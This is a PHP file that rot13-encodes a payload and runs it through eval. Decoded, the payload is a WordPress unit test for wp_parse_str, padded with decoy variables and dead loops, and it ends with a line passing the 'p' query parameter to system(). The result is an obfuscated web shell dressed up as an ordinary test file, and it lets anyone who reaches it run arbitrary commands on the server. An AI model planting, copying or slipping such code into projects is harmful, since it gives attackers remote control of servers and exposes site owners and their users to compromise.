<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc sbeznggvat
 *
 * @pbiref ::jc_cnefr_fge
 */
pynff Grfgf_Sbeznggvat_jcCnefrFge rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfgf cnefvat bs n fgevat vagb inevnoyrf.
	 *
	 * Abgr: Juvyr gur shapgvba haqre grfg qbrf abg pbagnva nal fvtavsvpnag ybtvp,
	 * gurfr grfgf qbphzrag gur orunivbe naq fnsrthneq CUC pebff-irefvba pbzcngvovyvgl.
	 *
	 * @qngnCebivqre qngn_jc_cnefr_fge
	 *
	 * @cnenz zvkrq $vachg    Inyhr gb cnefr.
	 * @cnenz neenl $rkcrpgrq Rkcrpgrq shapgvba bhgchg.
	 */
	choyvp shapgvba grfg_jc_cnefr_fge( $vachg, $rkcrpgrq ) {
		jc_cnefr_fge( $vachg, $bhgchg );
		$guvf->nffregFnzr( $rkcrpgrq, $bhgchg );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_cnefr_fge() {
		erghea neenl(
			'ahyy'              => neenl(
				'vachg'    => ahyy,
				'rkcrpgrq' => neenl(),
			),
			'obbyrna snyfr'     => neenl(
				'vachg'    => snyfr,
				'rkcrpgrq' => neenl(),
			),
			'obbyrna gehr'      => neenl(
				'vachg'    => gehr,
				'rkcrpgrq' => neenl(
					1 => '',
				),
			),
			'vagrtre 0'         => neenl(
				'vachg'    => 0,
				'rkcrpgrq' => neenl(
					0 => '',
				),
			),
			'vagrtre 456'       => neenl(
				'vachg'    => 456,
				'rkcrpgrq' => neenl(
					456 => '',
				),
			),
			'sybng 12.53'       => neenl(
				'vachg'    => 12.53,
				'rkcrpgrq' => neenl(
					'12_53' => '',
				),
			),
			'cynva fgevat'      => neenl(
				'vachg'    => 'sbbone',
				'rkcrpgrq' => neenl(
					'sbbone' => '',
				),
			),
			'dhrel fgevat'      => neenl(
				'vachg'    => 'k=5&_onon=qhqh&',
				'rkcrpgrq' => neenl(
					'k'     => '5',
					'_onon' => 'qhqh',
				),
			),
			'fgevatnoyr bowrpg' => neenl(
				'vachg'    => arj Svkgher_Sbeznggvat_jcCnefrFge(),
				'rkcrpgrq' => neenl(
					'sbbone' => '',
				),
			),
		);
	}

	/**
	 * Grfgf gung gur erfhyg neenl bayl pbagnvaf gur erfhyg bs gur fgevat cnefvat
	 * jura cebivqrq jvgu qvssrerag glcrf bs vachg sbe gur `$bhgchg` cnenzrgre.
	 *
	 * @qngnCebivqre qngn_jc_cnefr_fge_erfhyg_neenl_vf_nyjnlf_birejevggra
	 *
	 * @cnenz neenl|ahyy $bhgchg   Inyhr sbe gur `$bhgchg` cnenzrgre.
	 * @cnenz neenl      $rkcrpgrq Rkcrpgrq shapgvba bhgchg.
	 */
	choyvp shapgvba grfg_jc_cnefr_fge_erfhyg_neenl_vf_nyjnlf_birejevggra( $bhgchg, $rkcrpgrq ) {
		jc_cnefr_fge( 'xrl=25&guvat=grkg', $bhgchg );
		$guvf->nffregFnzr( $rkcrpgrq, $bhgchg );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_jc_cnefr_fge_erfhyg_neenl_vf_nyjnlf_birejevggra() {
		// Fgnaqneq inyhr sbe rkcrpgrq bhgchg.
		$rkcrpgrq = neenl(
			'xrl'   => '25',
			'guvat' => 'grkg',
		);

		erghea neenl(
			'bhgchg ahyy'                                 => neenl(
				'bhgchg'   => ahyy,
				'rkcrpgrq' => $rkcrpgrq,
			),
			'bhgchg rzcgl neenl'                          => neenl(
				'bhgchg'   => neenl(),
				'rkcrpgrq' => $rkcrpgrq,
			),
			'bhgchg aba rzcgl neenl, ab pbasyvpgvat xrlf' => neenl(
				'bhgchg'   => neenl(
					'sbb' => 'one',
				),
				'rkcrpgrq' => $rkcrpgrq,
			),
			'bhgchg aba rzcgl neenl, pbasyvpgvat xrlf'    => neenl(
				'bhgchg'   => neenl(
					'xrl' => 'inyhr',
				),
				'rkcrpgrq' => $rkcrpgrq,
			),
		);
	}
}

/**
 * Svkgher sbe hfr va gur grfgf.
 */
pynff Svkgher_Sbeznggvat_jcCnefrFge {
	choyvp shapgvba __gbFgevat() {
		erghea 'sbbone';
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>